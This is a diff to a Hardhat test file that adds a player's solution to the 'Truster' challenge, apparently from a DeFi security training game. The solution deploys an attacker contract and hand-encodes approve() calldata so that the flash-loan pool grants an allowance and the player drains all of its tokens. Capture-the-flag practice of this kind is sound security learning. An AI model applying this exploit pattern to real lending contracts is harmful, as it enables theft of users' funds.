@@ -1,5 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { utils } = require('ethers');
 
 describe('[Challenge] Truster', function () {
     let deployer, player;
@@ -7,7 +8,7 @@ describe('[Challenge] Truster', function () {
 
     const TOKENS_IN_POOL = 1000000n * 10n ** 18n;
 
-    before(async function () {
+    beforeEach(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, player] = await ethers.getSigners();
 
@@ -21,11 +22,26 @@ describe('[Challenge] Truster', function () {
         expect(await token.balanceOf(player.address)).to.equal(0);
     });
 
-    it('Execution', async function () {
+    it('Execution onchain', async function () {
         /** CODE YOUR SOLUTION HERE */
+        let attacker = await (await ethers.getContractFactory('TrusterAttacker', deployer)).deploy();
+        
+        await attacker.connect(player).attackOnchain(pool.address, 1000000n * 10n ** 18n,token.address);
     });
 
-    after(async function () {
+    it('Execution offchain', async function () {
+        /** CODE YOUR SOLUTION HERE */
+        let attacker = await (await ethers.getContractFactory('TrusterAttacker', deployer)).deploy();
+        
+        let data = ethers.utils.hexConcat([
+            '0x095ea7b3', //TODO
+            ethers.utils.defaultAbiCoder.encode(['address', 'uint256'], [attacker.address, 1000000n * 10n ** 18n])
+          ])
+
+        await attacker.connect(player).attackOffchain(pool.address, 1000000n * 10n ** 18n,token.address,data);
+    });
+
+    afterEach(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
 
         // Player has taken all tokens from the pool
